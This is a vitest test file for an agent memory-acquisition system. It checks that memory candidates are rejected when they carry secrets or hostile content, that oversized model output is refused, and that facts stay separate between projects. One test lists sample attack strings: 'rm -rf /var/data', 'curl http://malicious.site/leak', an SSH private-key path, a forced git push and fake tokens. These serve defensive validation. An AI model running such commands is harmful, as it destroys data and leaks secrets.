import { describe, expect, it } from 'vitest'
import { mkdtemp, realpath, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Session, SessionEvent } from '@deepseek-ai/dsh-session'
import type { GenerateOptions, LlmRuntime, StreamChunk } from '@deepseek-ai/dsh-llm'
import { createAcquisitionRuntime } from '../src/acquisition-runtime.js'
import { extractAcquisitionEvidence } from '../src/acquisition-evidence.js'
import {
  computeCandidateSha256,
  validateAcquisitionEvidence,
  validateMemoryCandidate,
  type RememberCandidate,
} from '../src/protocol/acquisition.js'
import { computeProjectScopeId, createScopeRuntime } from '../src/runtime-scope.js'
import { openMemoryFactStore } from '../src/memory-store.js'
import { createOKFCompiler } from '../src/okf-compiler.js'

describe('MVP-05 acquisition security and boundary enforcement', () => {
  async function setupEnvironment(name: string) {
    const base = await realpath(tmpdir())
    const root = await mkdtemp(join(base, `mnemosyne-sec-${name}-`))
    const projectScopeId = computeProjectScopeId(root)
    const scopeRuntime = createScopeRuntime({ projectRoot: root })
    const store = openMemoryFactStore({
      project_root: root,
      project_scope_id: projectScopeId,
    })
    const compiler = createOKFCompiler()

    return {
      root,
      projectScopeId,
      scopeRuntime,
      store,
      compiler,
      cleanup: async () => {
        await rm(root, { recursive: true, force: true })
      },
    }
  }

  function createMockLlm(streamFn: (options: GenerateOptions) => AsyncIterable<StreamChunk>): LlmRuntime {
    return {
      stream: (options: GenerateOptions) => streamFn(options),
    } as unknown as LlmRuntime
  }

  async function* textStream(text: string): AsyncIterable<StreamChunk> {
    yield { type: 'block-start', index: 0, blockType: 'text' }
    yield { type: 'text-delta', index: 0, text }
    yield { type: 'block-end', index: 0, block: { type: 'text', text } }
    yield { type: 'finish', reason: { kind: 'stop' } }
  }

  it('rejects candidate prompt injection, credential, path leak, and destructive command attempts', () => {
    const attacks = [
      { title: 'Safe title', summary: 'Safe summary', body: 'Found token: bearer abcdef0123456789' },
      { title: 'Safe title', summary: 'Safe summary', body: 'Look at /Users/victim/.ssh/id_rsa' },
      { title: 'Safe title', summary: 'Safe summary', body: 'Execute rm -rf /var/data' },
      { title: 'Safe title', summary: 'Safe summary', body: 'Run curl http://malicious.site/leak' },
      { title: 'Safe title', summary: 'Safe summary', body: 'git push origin main --force' },
      { title: 'Safe title', summary: 'Safe summary', body: 'api_key: secret_123456789' },
      { title: 'Safe title\0', summary: 'Safe summary', body: 'Safe body' },
      { title: 'Safe title', summary: 'Safe summary\x1b[31m', body: 'Safe body' },
      { title: 'Safe title', summary: 'Safe summary', body: 'Safe body', tags: ['rm -rf'] },
    ]

    for (const attack of attacks) {
      const candidate: RememberCandidate = {
        schema_version: 1,
        decision: 'remember',
        title: attack.title,
        summary: attack.summary,
        body: attack.body,
        tags: (attack as any).tags ?? ['valid'],
      }
      expect(() => validateMemoryCandidate(candidate)).toThrow()
    }
  })

  it('rejects oversized model output stream (> 16 KiB) and terminates with zero Fact write', async () => {
    const env = await setupEnvironment('oversized')

    const hugeBody = 'A'.repeat(20000)
    const mockLlm = createMockLlm(async function* () {
      yield* textStream(JSON.stringify({
        schema_version: 1,
        decision: 'remember',
        title: 'Huge title',
        summary: 'Huge summary',
        body: hugeBody,
        tags: ['test'],
      }))
    })

    const runtime = createAcquisitionRuntime({
      scopeRuntime: env.scopeRuntime,
      llm: mockLlm,
      storeFactory: (scope) => openMemoryFactStore({ project_root: scope.project_root, project_scope_id: scope.project_scope_id }),
      compiler: env.compiler,
    })

    const turnEndEvent: SessionEvent = {
      seq: 3,
      time: '2026-08-25T08:00:00.000Z',
      type: 'turn/end',
      turn: 1,
      data: { turn: 1, reason: { kind: 'completed' } },
    } as never

    const session: Session = {
      id: 'session_sec_oversized' as never,
      header: { cwd: env.root } as never,
      events: [
        { seq: 0, time: '2026-08-25T07:59:50.000Z', type: 'request/header', turn: 1, data: { header: { config: { provider: 'deepseek', model: 'deepseek-chat' } }, reason: 'initial' } } as never,
        { seq: 1, time: '2026-08-25T07:59:52.000Z', type: 'user/message', turn: 1, data: { id: 'u', source: { kind: 'user' }, content: [{ type: 'text', text: 'Prompt' }] } } as never,
        { seq: 2, time: '2026-08-25T07:59:55.000Z', type: 'assistant/message', turn: 1, data: { turn: 1, step: 1, message: { id: 'a', source: { kind: 'model', provider: 'deepseek', model: 'deepseek-chat' }, content: [{ type: 'text', text: 'Answer' }] } } } as never,
        turnEndEvent,
      ],
    } as unknown as Session

    env.scopeRuntime.observeSession(session)
    runtime.enqueueTurn(session, turnEndEvent)
    await runtime.drain()

    const scopeRes = env.scopeRuntime.observeSession(session)
    const sessionScopeId = (scopeRes as { scope: { session_scope_id: string } }).scope.session_scope_id
    const facts = await env.store.listShortTerm(sessionScopeId, '2026-08-25T08:00:00.000Z')
    expect(facts.length).toBe(0)

    await runtime.dispose()
    await env.cleanup()
  })

  it('strictly isolates facts between separate projects and sessions without leakage', async () => {
    const envA = await setupEnvironment('projA')
    const envB = await setupEnvironment('projB')

    const mockLlm = createMockLlm(() => {
      const candidate = {
        schema_version: 1,
        decision: 'remember',
        title: 'Project knowledge',
        summary: 'Summary',
        body: 'Body knowledge',
        tags: ['scope'],
      }
      return textStream(JSON.stringify(candidate))
    })

    const runtimeA = createAcquisitionRuntime({
      scopeRuntime: envA.scopeRuntime,
      llm: mockLlm,
      storeFactory: (scope) => openMemoryFactStore({ project_root: scope.project_root, project_scope_id: scope.project_scope_id }),
      compiler: envA.compiler,
    })

    const turnEndEvent: SessionEvent = {
      seq: 3,
      time: '2026-08-25T08:00:00.000Z',
      type: 'turn/end',
      turn: 1,
      data: { turn: 1, reason: { kind: 'completed' } },
    } as never

    const sessionA: Session = {
      id: 'session_A' as never,
      header: { cwd: envA.root } as never,
      events: [
        { seq: 0, time: '2026-08-25T07:59:50.000Z', type: 'request/header', turn: 1, data: { header: { config: { provider: 'deepseek', model: 'deepseek-chat' } }, reason: 'initial' } } as never,
        { seq: 1, time: '2026-08-25T07:59:52.000Z', type: 'user/message', turn: 1, data: { id: 'u', source: { kind: 'user' }, content: [{ type: 'text', text: 'Prompt A' }] } } as never,
        { seq: 2, time: '2026-08-25T07:59:55.000Z', type: 'assistant/message', turn: 1, data: { turn: 1, step: 1, message: { id: 'a', source: { kind: 'model', provider: 'deepseek', model: 'deepseek-chat' }, content: [{ type: 'text', text: 'Answer A' }] } } } as never,
        turnEndEvent,
      ],
    } as unknown as Session

    envA.scopeRuntime.observeSession(sessionA)
    runtimeA.enqueueTurn(sessionA, turnEndEvent)
    await runtimeA.drain()

    const scopeResA = envA.scopeRuntime.observeSession(sessionA)
    const sessionScopeIdA = (scopeResA as { scope: { session_scope_id: string } }).scope.session_scope_id

    // Facts in Project A exist
    const factsA = await envA.store.listShortTerm(sessionScopeIdA, '2026-08-25T08:00:00.000Z')
    expect(factsA.length).toBe(1)

    // Project B store must have 0 facts
    const factsB = await envB.store.listShortTerm(sessionScopeIdA, '2026-08-25T08:00:00.000Z')
    expect(factsB.length).toBe(0)

    await runtimeA.dispose()
    await envA.cleanup()
    await envB.cleanup()
  })
})
